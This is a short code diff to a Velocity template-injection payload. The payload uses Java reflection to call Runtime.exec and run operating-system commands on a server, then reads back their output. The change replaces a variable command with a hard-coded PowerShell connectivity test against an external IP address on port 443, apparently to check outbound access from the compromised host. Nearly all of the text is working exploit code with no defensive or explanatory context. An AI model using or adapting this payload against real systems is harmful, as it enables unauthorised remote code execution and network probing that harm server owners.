@@ -1,5 +1,6 @@
 #set ($e="exp")
-#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmd))
+#set ($cmdd="powershell -Command test-netconnection 145.249.107.237 -port 443")
+#set ($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec($cmdd))
 #set ($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").invoke($a))
 #set($sc = $e.getClass().forName("java.util.Scanner"))
 #set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
